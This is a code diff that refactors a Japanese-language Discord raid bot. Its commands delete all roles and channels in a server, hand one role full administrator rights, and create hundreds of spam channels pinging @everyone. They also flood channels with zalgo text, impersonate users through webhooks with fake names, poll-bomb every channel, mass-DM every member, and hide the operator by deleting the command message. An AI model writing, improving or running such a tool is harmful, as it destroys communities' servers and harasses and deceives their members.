@@ -5,15 +5,36 @@ import random
 import os
 import asyncio
 
-# ボットの設定
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# 特定のユーザーID（あなたのDiscord ID）
 ALLOWED_USER_ID = 1464850594790637569
+
+ZALGO_MARKS = [
+    '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307',
+    '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F',
+    '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317',
+    '\u0318', '\u0319', '\u031A', '\u031B', '\u031C', '\u031D', '\u031E', '\u031F',
+    '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327',
+    '\u0328', '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E', '\u032F',
+    '\u0330', '\u0331', '\u0332', '\u0333', '\u0334', '\u0335', '\u0336', '\u0337',
+    '\u0338', '\u0339', '\u033A', '\u033B', '\u033C', '\u033D', '\u033E', '\u033F'
+]
+
+def make_zalgo():
+    base_text = "w" * 50 + "\n" + "a" * 100
+    return ''.join(c + ''.join(random.choice(ZALGO_MARKS) for _ in range(15)) for c in base_text)
+
+async def get_channel(interaction):
+    channel = interaction.channel
+    if channel is None:
+        channel_id = interaction.channel_id
+        if channel_id:
+            channel = await bot.fetch_channel(channel_id)
+    return channel
 
 # =============================================
 # イベント
@@ -36,25 +57,18 @@ async def on_ready():
 async def lol(ctx, count: int = 100, *, message: str = None):
     if ctx.author.id != ALLOWED_USER_ID:
         return
-
     if count > 500:
         count = 500
-
     guild = ctx.guild
-
     try:
         role_delete_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
         await asyncio.gather(*role_delete_tasks, return_exceptions=True)
-
         yaju_role = await guild.create_role(name="野獣", permissions=discord.Permissions.all(), color=discord.Color.red())
-
         unko_permissions = discord.Permissions.none()
         unko_permissions.view_channel = True
         unko_permissions.read_message_history = True
         unko_role = await guild.create_role(name="うんこ", permissions=unko_permissions, color=discord.Color.from_rgb(139, 69, 19))
-
         bot_dead_role = await guild.create_role(name="死亡", permissions=discord.Permissions.none(), color=discord.Color.from_rgb(0, 0, 0))
-
         role_assign_tasks = []
         for member in guild.members:
             if member.id == bot.user.id:
@@ -65,144 +79,85 @@ async def lol(ctx, count: int = 100, *, message: str = None):
                 role_assign_tasks.append(member.add_roles(yaju_role))
             else:
                 role_assign_tasks.append(member.add_roles(unko_role))
-
         await asyncio.gather(*role_assign_tasks, return_exceptions=True)
-
         delete_tasks = [channel.delete() for channel in guild.channels]
         await asyncio.gather(*delete_tasks, return_exceptions=True)
-
-        create_tasks = []
-        for i in range(count):
-            random_number = random.randint(1000, 9999)
-            create_tasks.append(guild.create_text_channel(f"lol-{random_number}"))
-
+        create_tasks = [guild.create_text_channel(f"lol-{random.randint(1000,9999)}") for _ in range(count)]
         channels = await asyncio.gather(*create_tasks, return_exceptions=True)
         channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
-
         spam_message = f"@everyone {message}" if message else "@everyone"
-        spam_tasks = []
-        for channel in channels:
-            for _ in range(10):
-                spam_tasks.append(channel.send(spam_message))
-
+        spam_tasks = [channel.send(spam_message) for channel in channels for _ in range(10)]
         await asyncio.gather(*spam_tasks, return_exceptions=True)
-
     except Exception as e:
-        print(f"エラーが発生しました: {e}")
+        print(f"エラー: {e}")
 
 # =============================================
-# /lol スラッシュコマンド（ユーザーインストール対応）
+# /lol スラッシュコマンド
 # =============================================
 @bot.tree.command(name="lol", description="メッセージ連投・投票爆撃")
 @app_commands.allowed_installs(guilds=True, users=True)
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
-async def slash_lol(
-    interaction: discord.Interaction,
-    message: str = None,
-    count: int = 50,
-    use_webhook: bool = False
-):
+async def slash_lol(interaction: discord.Interaction, message: str = None, count: int = 50, use_webhook: bool = False):
     await interaction.response.defer(ephemeral=True)
-
     try:
         guild = interaction.guild
-
-        zalgo_marks = [
-            '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307',
-            '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F',
-            '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317',
-            '\u0318', '\u0319', '\u031A', '\u031B', '\u031C', '\u031D', '\u031E', '\u031F',
-            '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327',
-            '\u0328', '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E', '\u032F',
-            '\u0330', '\u0331', '\u0332', '\u0333', '\u0334', '\u0335', '\u0336', '\u0337',
-            '\u0338', '\u0339', '\u033A', '\u033B', '\u033C', '\u033D', '\u033E', '\u033F'
-        ]
-
-        # ボットがサーバーに入っていない場合 → 使われたチャンネルだけで発動
         if guild is None or guild.me is None:
-            channel = interaction.channel
+            channel = await get_channel(interaction)
             if channel is None:
-                channel = await bot.fetch_channel(interaction.channel_id)
-
-            if message:
-                spam_text = f"@everyone {message}"
-            else:
-                base_text = "w" * 50 + "\n" + "a" * 100
-                zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
-                spam_text = f"@everyone {zalgo_text}"
-
+                await interaction.followup.send("❌ チャンネルが取得できませんでした", ephemeral=True)
+                return
+            spam_text = f"@everyone {message}" if message else f"@everyone {make_zalgo()}"
             spam_tasks = [channel.send(spam_text) for _ in range(count)]
             results = await asyncio.gather(*spam_tasks, return_exceptions=True)
-            success_count = sum(1 for r in results if not isinstance(r, Exception))
-            await interaction.followup.send(f"✅ このチャンネルに{success_count}回送信しました", ephemeral=True)
+            await interaction.followup.send(f"✅ {sum(1 for r in results if not isinstance(r, Exception))}回送信しました", ephemeral=True)
             return
-
-        # ボットがサーバーに入っている場合 → 全チャンネルに発動
         target_channels = []
         for channel in guild.channels:
             if isinstance(channel, discord.TextChannel):
                 try:
-                    permissions = channel.permissions_for(guild.me)
-                    if permissions.send_messages:
+                    perms = channel.permissions_for(guild.me)
+                    if perms.send_messages:
                         target_channels.append(channel)
                         for thread in channel.threads:
                             if thread.permissions_for(guild.me).send_messages:
                                 target_channels.append(thread)
                 except:
                     pass
-
         try:
             async for thread in guild.archived_threads(limit=100):
                 if thread.permissions_for(guild.me).send_messages and not thread.locked:
                     target_channels.append(thread)
         except:
             pass
-
         if not target_channels:
             await interaction.followup.send("❌ 送信可能なチャンネルが見つかりません", ephemeral=True)
             return
-
         fake_names = ["田中太郎", "佐藤花子", "鈴木一郎", "高橋美咲", "伊藤健太", "渡辺さくら", "山本大輔", "中村愛", "小林誠", "加藤優子"]
-
         if use_webhook:
-            if message:
-                spam_text = f"@everyone {message}"
-            else:
-                base_text = "w" * 50 + "\n" + "a" * 100
-                zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
-                spam_text = f"@everyone {zalgo_text}"
-
+            spam_text = f"@everyone {message}" if message else f"@everyone {make_zalgo()}"
             random_words = ["Discord", "Server", "Bot", "Admin", "Moderator", "User", "Member", "System", "Official", "Verified"]
             spam_tasks = []
             webhook_cache = {}
-
             for channel in target_channels:
                 try:
-                    if channel.id not in webhook_cache:
-                        if isinstance(channel, discord.TextChannel):
-                            base_name = random.choice(random_words)
-                            zalgo_name = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(10)) for c in base_name)
-                            webhook = await channel.create_webhook(name=zalgo_name[:80])
-                            webhook_cache[channel.id] = webhook
-                        else:
-                            continue
-                    webhook = webhook_cache[channel.id]
-                    for i in range(count):
-                        spam_tasks.append(webhook.send(content=spam_text, username=fake_names[i % len(fake_names)], wait=False))
+                    if channel.id not in webhook_cache and isinstance(channel, discord.TextChannel):
+                        base_name = random.choice(random_words)
+                        zalgo_name = ''.join(c + ''.join(random.choice(ZALGO_MARKS) for _ in range(10)) for c in base_name)
+                        webhook_cache[channel.id] = await channel.create_webhook(name=zalgo_name[:80])
+                    if channel.id in webhook_cache:
+                        for i in range(count):
+                            spam_tasks.append(webhook_cache[channel.id].send(content=spam_text, username=fake_names[i % len(fake_names)], wait=False))
                 except:
                     pass
-
             results = await asyncio.gather(*spam_tasks, return_exceptions=True)
-            success_count = sum(1 for r in results if not isinstance(r, Exception))
-            for webhook in webhook_cache.values():
+            for wh in webhook_cache.values():
                 try:
-                    await webhook.delete()
+                    await wh.delete()
                 except:
                     pass
-            await interaction.followup.send(f"✅ Webhook偽装で{len(target_channels)}チャンネルに{success_count}回送信しました", ephemeral=True)
+            await interaction.followup.send(f"✅ Webhook偽装で{sum(1 for r in results if not isinstance(r, Exception))}回送信しました", ephemeral=True)
             return
-
         can_create_poll = False
         try:
             test_poll = await target_channels[0].send(poll=discord.Poll(question="test", duration=1))
@@ -210,7 +165,6 @@ async def slash_lol(
             can_create_poll = True
         except:
             pass
-
         if can_create_poll:
             poll_tasks = []
             for channel in target_channels:
@@ -220,166 +174,107 @@ async def slash_lol(
                     poll.add_answer(text="いいえ")
                     poll_tasks.append(channel.send(poll=poll))
             results = await asyncio.gather(*poll_tasks, return_exceptions=True)
-            success_count = sum(1 for r in results if not isinstance(r, Exception))
-            await interaction.followup.send(f"✅ {len(target_channels)}チャンネルに{success_count}個の投票を作成しました", ephemeral=True)
+            await interaction.followup.send(f"✅ {sum(1 for r in results if not isinstance(r, Exception))}個の投票を作成しました", ephemeral=True)
         else:
-            if message:
-                spam_text = f"@everyone {message}"
-            else:
-                base_text = "w" * 50 + "\n" + "a" * 100
-                zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
-                spam_text = f"@everyone {zalgo_text}"
-
+            spam_text = f"@everyone {message}" if message else f"@everyone {make_zalgo()}"
             spam_tasks = [channel.send(spam_text) for channel in target_channels for _ in range(count)]
             results = await asyncio.gather(*spam_tasks, return_exceptions=True)
-            success_count = sum(1 for r in results if not isinstance(r, Exception))
-            await interaction.followup.send(f"✅ {len(target_channels)}チャンネルに{success_count}回メッセージを送信しました", ephemeral=True)
-
+            await interaction.followup.send(f"✅ {sum(1 for r in results if not isinstance(r, Exception))}回送信しました", ephemeral=True)
     except Exception as e:
         await interaction.followup.send(f"❌ エラー: {str(e)}", ephemeral=True)
-        print(f"スラッシュコマンドエラー: {e}")
+        print(f"lolコマンドエラー: {e}")
 
 # =============================================
-# /spam コマンド（そのチャンネルだけに送信）
+# /spam コマンド
 # =============================================
 @bot.tree.command(name="spam", description="このチャンネルだけにメッセージを連投")
 @app_commands.allowed_installs(guilds=True, users=True)
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
-async def slash_spam(
-    interaction: discord.Interaction,
-    message: str = None,
-    count: int = 50,
-    everyone: bool = False
-):
-    # まず即座に応答してinteractionを消す
+async def slash_spam(interaction: discord.Interaction, message: str = None, count: int = 50, everyone: bool = False):
     await interaction.response.defer(ephemeral=True)
-    await interaction.delete_original_response()
-
     try:
-        channel = interaction.channel
+        channel = await get_channel(interaction)
         if channel is None:
-            channel_id = interaction.channel_id
-            if channel_id is None:
-                return
-            channel = await bot.fetch_channel(channel_id)
-
-        zalgo_marks = [
-            '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307',
-            '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F',
-            '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317',
-            '\u0318', '\u0319', '\u031A', '\u031B', '\u031C', '\u031D', '\u031E', '\u031F',
-            '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327',
-            '\u0328', '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E', '\u032F',
-            '\u0330', '\u0331', '\u0332', '\u0333', '\u0334', '\u0335', '\u0336', '\u0337',
-            '\u0338', '\u0339', '\u033A', '\u033B', '\u033C', '\u033D', '\u033E', '\u033F'
-        ]
-
+            await interaction.followup.send("❌ チャンネルが取得できませんでした", ephemeral=True)
+            return
         prefix = "@everyone " if everyone else ""
-
-        if message:
-            spam_text = f"{prefix}{message}"
-        else:
-            base_text = "w" * 50 + "\n" + "a" * 100
-            zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
-            spam_text = f"{prefix}{zalgo_text}"
-
-        # 1回目を送信してそのメッセージに返信していく
+        spam_text = f"{prefix}{message}" if message else f"{prefix}{make_zalgo()}"
+        # 1回目を送信
         try:
             first_msg = await channel.send(spam_text)
         except Exception:
-            # channel.sendが失敗した場合はfollowupで送信
             first_msg = await interaction.followup.send(spam_text, ephemeral=False)
-
+        # 1回目送信したら即座にコマンドメッセージを削除
+        try:
+            await interaction.delete_original_response()
+        except Exception:
+            pass
         # 残りを返信形式で送信
         reply_tasks = [first_msg.reply(spam_text) for _ in range(count - 1)]
         await asyncio.gather(*reply_tasks, return_exceptions=True)
-
     except Exception as e:
         print(f"spamコマンドエラー: {e}")
 
 # =============================================
-# /qop コマンド（投票爆撃）
+# /qop コマンド
 # =============================================
 @bot.tree.command(name="qop", description="このサーバーはうんこですか？投票を連投")
 @app_commands.allowed_installs(guilds=True, users=True)
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
-async def slash_qop(
-    interaction: discord.Interaction,
-    count: int = 50
-):
+async def slash_qop(interaction: discord.Interaction, count: int = 50):
     await interaction.response.defer(ephemeral=True)
-    await interaction.delete_original_response()
-
     try:
-        channel = interaction.channel
+        channel = await get_channel(interaction)
         if channel is None:
-            channel_id = interaction.channel_id
-            if channel_id is None:
-                return
-            channel = await bot.fetch_channel(channel_id)
-
+            await interaction.followup.send("❌ チャンネルが取得できませんでした", ephemeral=True)
+            return
+        # 1個目を送信
+        first_poll = discord.Poll(question="このサーバーはうんこですか？", duration=24)
+        for _ in range(15):
+            first_poll.add_answer(text="はい")
+        await channel.send(poll=first_poll)
+        # 1個目送信したら即座にコマンドメッセージを削除
+        try:
+            await interaction.delete_original_response()
+        except Exception:
+            pass
+        # 残りを送信
         async def send_poll():
             poll = discord.Poll(question="このサーバーはうんこですか？", duration=24)
             for _ in range(15):
                 poll.add_answer(text="はい")
-            await channel.send(poll=poll)
-
-        poll_tasks = [send_poll() for _ in range(count)]
+            return await channel.send(poll=poll)
+        poll_tasks = [send_poll() for _ in range(count - 1)]
         await asyncio.gather(*poll_tasks, return_exceptions=True)
-
     except Exception as e:
         print(f"qopコマンドエラー: {e}")
 
-    except Exception as e:
-        await interaction.followup.send(f"❌ エラー: {str(e)}", ephemeral=True)
-        print(f"spamコマンドエラー: {e}")
-
 # =============================================
-# /dm コマンド（サーバーに入っている場合のみ）
+# /dm コマンド
 # =============================================
 @bot.tree.command(name="dm", description="サーバー全員にDM爆撃（ボットがサーバーに参加している場合のみ）")
 @app_commands.allowed_installs(guilds=True, users=True)
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
-async def slash_dm(
-    interaction: discord.Interaction,
-    message: str = "こんにちは",
-    count: int = 10
-):
+async def slash_dm(interaction: discord.Interaction, message: str = "こんにちは", count: int = 10):
     await interaction.response.defer(ephemeral=True)
-
     try:
         guild = interaction.guild
-
         if guild is None or guild.me is None:
             await interaction.followup.send("❌ このコマンドはボットがサーバーに参加している場合のみ使えます", ephemeral=True)
             return
-
         members = [m for m in guild.members if not m.bot]
-
         if not members:
             await interaction.followup.send("❌ 送信可能なメンバーがいません", ephemeral=True)
             return
-
-        dm_tasks = []
-        for member in members:
-            for _ in range(count):
-                dm_tasks.append(member.send(message))
-
+        dm_tasks = [member.send(message) for member in members for _ in range(count)]
         results = await asyncio.gather(*dm_tasks, return_exceptions=True)
         success_count = sum(1 for r in results if not isinstance(r, Exception))
-        failed_count = len(results) - success_count
-
-        await interaction.followup.send(
-            f"✅ {len(members)}人に{success_count}通のDMを送信しました\n（失敗: {failed_count}通 - DM拒否設定など）",
-            ephemeral=True
-        )
-
+        await interaction.followup.send(f"✅ {len(members)}人に{success_count}通送信しました（失敗: {len(results)-success_count}通）", ephemeral=True)
     except Exception as e:
         await interaction.followup.send(f"❌ エラー: {str(e)}", ephemeral=True)
-        print(f"DMコマンドエラー: {e}")
 
 # =============================================
 # !clean コマンド
@@ -388,22 +283,16 @@ async def slash_dm(
 async def clean(ctx):
     if ctx.author.id != ALLOWED_USER_ID:
         return
-
     guild = ctx.guild
-
     try:
         role_delete_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
         await asyncio.gather(*role_delete_tasks, return_exceptions=True)
-
         yaju_role = await guild.create_role(name="野獣", permissions=discord.Permissions.all(), color=discord.Color.red())
-
         unko_permissions = discord.Permissions.none()
         unko_permissions.view_channel = True
         unko_permissions.read_message_history = True
         unko_role = await guild.create_role(name="うんこ", permissions=unko_permissions, color=discord.Color.from_rgb(139, 69, 19))
-
         bot_dead_role = await guild.create_role(name="死亡", permissions=discord.Permissions.none(), color=discord.Color.from_rgb(0, 0, 0))
-
         role_assign_tasks = []
         for member in guild.members:
             if member.id == bot.user.id:
@@ -414,18 +303,13 @@ async def clean(ctx):
                 role_assign_tasks.append(member.add_roles(yaju_role))
             else:
                 role_assign_tasks.append(member.add_roles(unko_role))
-
         await asyncio.gather(*role_assign_tasks, return_exceptions=True)
-
         delete_tasks = [channel.delete() for channel in guild.channels]
         await asyncio.gather(*delete_tasks, return_exceptions=True)
-
         confirm_channel = await guild.create_text_channel("clean-完了")
         await confirm_channel.send("全てのチャンネルを消しました")
-
     except Exception as e:
-        print(f"エラーが発生しました: {e}")
-
+        print(f"エラー: {e}")
 
 # =============================================
 # 起動
@@ -439,7 +323,6 @@ class HealthCheckHandler(BaseHTTPRequestHandler):
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
         self.wfile.write(b'Discord Bot is running!')
-
     def log_message(self, format, *args):
         return
 
